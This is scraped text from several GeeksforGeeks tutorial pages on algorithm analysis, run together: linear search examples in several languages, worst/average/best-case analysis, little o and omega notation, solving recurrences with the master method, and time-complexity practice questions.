sizeof(arr[0]); cout << x << " is present at index " << search(arr, n, x); getchar(); return 0; } // This code is contributed // by Akanksha Rai chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // C implementation of the approach #include <stdio.h> // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } /* Driver program to test above functions*/ int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / sizeof(arr[0]); printf("%d is present at index %d", x, search(arr, n, x)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java implementation of the approach public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void main(String[] args) { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = arr.length; System.out.printf("%d is present at index %d", x, search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python 3 implementation of the approach # Linearly search x in arr[]. If x is present # then return the index, otherwise return -1 def search(arr, x): for index, value in enumerate(arr): if value == x: return index return -1 # Driver Code arr = [1, 10, 30, 15] x = 30 print(x, "is present at index", search(arr, x)) # This code is contributed # by PrinciRaj1992 chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# implementation of the approach using System; public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int[] arr, int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void Main() { int[] arr = { 1, 10, 30, 15 }; int x = 30; int n = arr.Length; Console.WriteLine(x + " is present at index " + search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP implementation of the approach // Linearly search x in arr[]. If x // is present then return the index, // otherwise return -1 function search($arr, $n, $x) { for ($i = 0; $i < $n; $i++) { if ($arr[$i] == $x) return $i; } return -1; } // Driver Code $arr = array(1, 10, 30, 15); $x = 30; $n = sizeof($arr); echo $x . " is present at index ". search($arr, $n, $x); // This code is contributed // by Akanksha Rai chevron_right filter_none Output: 30 is present at index 2 Worst Case Analysis (Usually Done) In the worst case analysis, we calculate upper bound on running time of an algorithm. We must know the case that causes maximum number of operations to be executed. For Linear Search, the worst case happens when the element to be searched (x in the above code) is not present in the array. When x is not present, the search() functions compares it with all the elements of arr[] one by one. Therefore, the worst case time complexity of linear search would be Θ(n). Average Case Analysis (Sometimes done) In average case analysis, we take all possible inputs and calculate computing time for all of the inputs. Sum all the calculated values and divide the sum by total number of inputs. We must know (or predict) distribution of cases. For the linear search problem, let us assume that all cases are uniformly distributed (including the case of x not being present in array). So we sum all the cases and divide the sum by (n+1). Following is the value of average case time complexity. Average Case Time = = = Θ(n) Best Case Analysis (Bogus) In the best case analysis, we calculate lower bound on running time of an algorithm. We must know the case that causes minimum number of operations to be executed. In the linear search problem, the best case occurs when x is present at the first location. The number of operations in the best case is constant (not dependent on n). So time complexity in the best case would be Θ(1) Most of the times, we do worst case analysis to analyze algorithms. In the worst analysis, we guarantee an upper bound on the running time of an algorithm which is good information. The average case analysis is not easy to do in most of the practical cases and it is rarely done. In the average case analysis, we must know (or predict) the mathematical distribution of all possible inputs. The Best Case analysis is bogus. Guaranteeing a lower bound on an algorithm doesn’t provide any information as in the worst case, an algorithm may take years to run.For some algorithms, all the cases are asymptotically same, i.e., there are no worst and best cases. For example, Merge Sort. Merge Sort does Θ(nLogn) operations in all cases. Most of the other sorting algorithms have worst and best cases. For example, in the typical implementation of Quick Sort (where pivot is chosen as a corner element), the worst occurs when the input array is already sorted and the best occur when the pivot elements always divide array in two halves. For insertion sort, the worst case occurs when the array is reverse sorted and the best case occurs when the array is sorted in the same order as output. Next – Analysis of Algorithms | Set 3 (Asymptotic Notations) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Don’t Forget The Edge Cases !Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Difference between Posteriori and Priori analysisFind array elements that are greater than averageAverage of Cubes of first N natural numbers6 Best CSS frameworks You should Know to design Attractive WebsitesPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchImproved By : princiraj1992, Akanksha_Rai, AnkurChattopadhyay, GauriShankarBadola Article Tags : AnalysisArticles thumb_up 158 To-do Done 1.5 Based on 341 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 1 (Asymptotic Analysis) Next last_page Reservoir Sampling Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Understanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity Analysis Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of algorithms | little o and little omega notations - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Lower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Analysis of algorithms | little o and little omega notations Last Updated: 19-04-2020 The main idea of asymptotic analysis is to have a measure of efficiency of algorithms that doesn’t depend on machine specific constants, mainly because this analysis doesn’t require algorithms to be implemented and time taken by programs to be compared. We have already discussed Three main asymptotic notations. The following 2 more asymptotic notations are used to represent time complexity of algorithms. Little ο asymptotic notation Big-Ο is used as a tight upper-bound on the growth of an algorithm’s effort (this effort is described by the function f(n)), even though, as written, it can also be a loose upper-bound. “Little-ο” (ο()) notation is used to describe an upper-bound that cannot be tight. Definition : Let f(n) and g(n) be functions that map positive integers to positive real numbers. We say that f(n) is ο(g(n)) (or f(n) Ε ο(g(n))) if for any real constant c > 0, there exists an integer constant n0 ≥ 1 such that 0 ≤ f(n) < c*g(n). Thus, little o() means loose upper-bound of f(n). Little o is a rough estimate of the maximum order of growth whereas Big-Ο may be the actual order of growth. In mathematical relation, f(n) = o(g(n)) means lim f(n)/g(n) = 0 n→∞ Examples: Is 7n + 8 ∈ o(n2)? In order for that to be true, for any c, we have to be able to find an n0 that makes f(n) < c * g(n) asymptotically true. lets took some example, If c = 100,we check the inequality is clearly true. If c = 1/100 , we’ll have to use a little more imagination, but we’ll be able to find an n0. (Try n0 = 1000.) From these examples, the conjecture appears to be correct. then check limits, lim f(n)/g(n) = lim (7n + 8)/(n2) = lim 7/2n = 0 (l’hospital) n→∞ n→∞ n→∞ hence 7n + 8 ∈ o(n2) Little ω asymptotic notation Definition : Let f(n) and g(n) be functions that map positive integers to positive real numbers. We say that f(n) is ω(g(n)) (or f(n) ∈ ω(g(n))) if for any real constant c > 0, there exists an integer constant n0 ≥ 1 such that f(n) > c * g(n) ≥ 0 for every integer n ≥ n0. f(n) has a higher growth rate than g(n) so main difference between Big Omega (Ω) and little omega (ω) lies in their definitions.In the case of Big Omega f(n)=Ω(g(n)) and the bound is 0<=cg(n)<=f(n), but in case of little omega, it is true for 0<=c*g(n)<f(n). The relationship between Big Omega (Ω) and Little Omega (ω) is similar to that of Big-Ο and Little o except that now we are looking at the lower bounds. Little Omega (ω) is a rough estimate of the order of the growth whereas Big Omega (Ω) may represent exact order of growth. We use ω notation to denote a lower bound that is not asymptotically tight. And, f(n) ∈ ω(g(n)) if and only if g(n) ∈ ο((f(n)). In mathematical relation, if f(n) ∈ ω(g(n)) then, lim f(n)/g(n) = ∞ n→∞ Example: Prove that 4n + 6 ∈ ω(1); the little omega(ο) running time can be proven by applying limit formula given below. if lim f(n)/g(n) = ∞ then functions f(n) is ω(g(n)) n→∞ here,we have functions f(n)=4n+6 and g(n)=1 lim (4n+6)/(1) = ∞ n→∞ and,also for any c we can get n0 for this inequality 0 <= c*g(n) < f(n), 0 <= c*1 < 4n+6 Hence proved. This article is contributed by Kadam Patel. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Difference between Big Oh, Big Omega and Big ThetaAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Properties of Asymptotic NotationsAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisDifference between Posteriori and Priori analysisAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisImproved By : OmkarJai, tannishakundu Article Tags : Analysis thumb_up 36 To-do Done 2.2 Based on 47 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Master Theorem For Subtract and Conquer Recurrences Next last_page Online Algorithm Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete More related articles in Analysis Applications of HashingDifferent types of recurrence relations and their solutionsDifference between Deterministic and Non-deterministic AlgorithmsHow to learn Pattern printing easily?Properties of Asymptotic Notations room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 4 (Solving Recurrences) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithm | Set 4 (Solving Recurrences) Last Updated: 22-04-2020 In the previous post, we discussed analysis of loops. Many algorithms are recursive in nature. When we analyze them, we get a recurrence relation for time complexity. We get running time on an input of size n as a function of n and the running time on inputs of smaller sizes. For example in Merge Sort, to sort a given array, we divide it in two halves and recursively repeat the process for the two halves. Finally we merge the results. Time complexity of Merge Sort can be written as T(n) = 2T(n/2) + cn. There are many other algorithms like Binary Search, Tower of Hanoi, etc. There are mainly three ways for solving recurrences. 1) Substitution Method: We make a guess for the solution and then we use mathematical induction to prove the guess is correct or incorrect. For example consider the recurrence T(n) = 2T(n/2) + n We guess the solution as T(n) = O(nLogn). Now we use induction to prove our guess. We need to prove that T(n) <= cnLogn. We can assume that it is true for values smaller than n. T(n) = 2T(n/2) + n <= 2cn/2Log(n/2) + n = cnLogn - cnLog2 + n = cnLogn - cn + n <= cnLogn 2) Recurrence Tree Method: In this method, we draw a recurrence tree and calculate the time taken by every level of tree. Finally, we sum the work done at all levels. To draw the recurrence tree, we start from the given recurrence and keep drawing till we find a pattern among levels. The pattern is typically a arithmetic or geometric series. For example consider the recurrence relation T(n) = T(n/4) + T(n/2) + cn2 cn2 / \ T(n/4) T(n/2) If we further break down the expression T(n/4) and T(n/2), we get following recursion tree. cn2 / \ c(n2)/16 c(n2)/4 / \ / \ T(n/16) T(n/8) T(n/8) T(n/4) Breaking down further gives us following cn2 / \ c(n2)/16 c(n2)/4 / \ / \ c(n2)/256 c(n2)/64 c(n2)/64 c(n2)/16 / \ / \ / \ / \ To know the value of T(n), we need to calculate sum of tree nodes level by level. If we sum the above tree level by level, we get the following series T(n) = c(n^2 + 5(n^2)/16 + 25(n^2)/256) + .... The above series is geometrical progression with ratio 5/16. To get an upper bound, we can sum the infinite series. We get the sum as (n2)/(1 - 5/16) which is O(n2) 3) Master Method: Master Method is a direct way to get the solution. The master method works only for following type of recurrences or for recurrences that can be transformed to following type. T(n) = aT(n/b) + f(n) where a >= 1 and b > 1 There are following three cases: 1. If f(n) = Θ(nc) where c < Logba then T(n) = Θ(nLogba) 2. If f(n) = Θ(nc) where c = Logba then T(n) = Θ(ncLog n) 3.If f(n) = Θ(nc) where c > Logba then T(n) = Θ(f(n)) How does this work? Master method is mainly derived from recurrence tree method. If we draw recurrence tree of T(n) = aT(n/b) + f(n), we can see that the work done at root is f(n) and work done at all leaves is Θ(nc) where c is Logba. And the height of recurrence tree is Logbn In recurrence tree method, we calculate total work done. If the work done at leaves is polynomially more, then leaves are the dominant part, and our result becomes the work done at leaves (Case 1). If work done at leaves and root is asymptotically same, then our result becomes height multiplied by work done at any level (Case 2). If work done at root is asymptotically more, then our result becomes work done at root (Case 3). Examples of some standard algorithms whose time complexity can be evaluated using Master Method Merge Sort: T(n) = 2T(n/2) + Θ(n). It falls in case 2 as c is 1 and Logba] is also 1. So the solution is Θ(n Logn) Binary Search: T(n) = T(n/2) + Θ(1). It also falls in case 2 as c is 0 and Logba is also 0. So the solution is Θ(Logn) Notes: 1) It is not necessary that a recurrence of the form T(n) = aT(n/b) + f(n) can be solved using Master Theorem. The given three cases have some gaps between them. For example, the recurrence T(n) = 2T(n/2) + n/Logn cannot be solved using master method. 2) Case 2 can be extended for f(n) = Θ(ncLogkn) If f(n) = Θ(ncLogkn) for some constant k >= 0 and c = Logba, then T(n) = Θ(ncLogk+1n) Practice Problems and Solutions on Master Theorem. Next – Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) References: http://en.wikipedia.org/wiki/Master_theorem MIT Video Lecture on Asymptotic Notation | Recurrences | Substitution, Master Method Introduction to Algorithms 3rd Edition by Clifford Stein, Thomas H. Cormen, Charles E. Leiserson, Ronald L. Rivest Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Algorithms | Recurrences | Set 1Algorithms Sample Questions | Recurrences | Set 2Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Master Theorem For Subtract and Conquer RecurrencesAdvanced master theorem for divide and conquer recurrencesAnalysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisImproved By : Manish Dhanuka, animagussirius7 Article Tags : Analysis thumb_up 55 To-do Done 2.8 Based on 196 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 4 (Analysis of Loops) Next last_page Tail Recursion Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program More related articles in Analysis Analysis of different sorting techniquesCyclomatic ComplexityProof that traveling salesman problem is NP HardAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Practice Questions on Time Complexity Analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Practice Questions on Time Complexity AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis) Practice Questions on Time Complexity Analysis Last Updated: 12-12-2017 Prerequiste: Analysis of Algorithms 1. What is the time, space complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0, b = 0; for (i = 0; i < N; i++) { a = a + rand(); } for (j = 0; j < M; j++) { b = b + rand(); } chevron_right filter_none Options: O(N * M) time, O(1) space O(N + M) time, O(N + M) space O(N + M) time, O(1) space O(N * M) time, O(N + M) space Output: 3. O(N + M) time, O(1) space Explanation: The first loop is O(N) and the second loop is O(M). Since we don’t know which is bigger, we say this is O(N + M). This can also be written as O(max(N, M)). Since there is no additional space being utilized, the space complexity is constant / O(1) 2. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0; for (i = 0; i < N; i++) { for (j = N; j > i; j--) { a = a + i + j; } } chevron_right filter_none Options: O(N) O(N*log(N)) O(N * Sqrt(N)) O(N*N) Output: 4. O(N*N) Explanation: The above code runs total no of times = N + (N – 1) + (N – 2) + … 1 + 0 = N * (N + 1) / 2 = 1/2 * N^2 + 1/2 * N O(N^2) times. 3. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int i, j, k = 0; for (i = n / 2; i <= n; i++) { for (j = 2; j <= n; j = j * 2) { k = k + n / 2; } } chevron_right filter_none Options: O(n) O(nLogn) O(n^2) O(n^2Logn) Output: 2. O(nLogn) Explanation:If you notice, j keeps doubling till it is less than or equal to n. Number of times, we can double a number till it is less than n would be log(n). Let’s take the examples here. for n = 16, j = 2, 4, 8, 16 for n = 32, j = 2, 4, 8, 16, 32 So, j would run for O(log n) steps. i runs for n/2 steps. So, total steps = O(n/ 2 * log (n)) = O(n*logn) 4. What does it mean when we say that an algorithm X is asymptotically more efficient than Y? Options: X will always be a better choice for small inputs X will always be a better choice for large inputs Y will always be a better choice for small inputs X will always be a better choice for all inputs 2. X will always be a better choice for large inputs Explanation: In asymptotic analysis we consider growth of algorithm in terms of input size. An algorithm X is said to be asymptotically better than Y if X takes smaller time than y for all input sizes n larger than a value n0 where n0 > 0. 5. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0, i = N; while (i > 0) { a += i; i /= 2; } chevron_right filter_none Options: O(N) O(Sqrt(N)) O(N / 2) O(log N) Output: 4. O(log N) Explanation: We have to find the smallest x such that N / 2^x N x = log(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Time Complexity Analysis | Tower Of Hanoi (Recursion)Complexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapAlgorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPython Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersA Time Complexity QuestionUnderstanding Time Complexity with Simple ExamplesWhat does 'Space Complexity' mean?Abhishek Sharma 44Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other 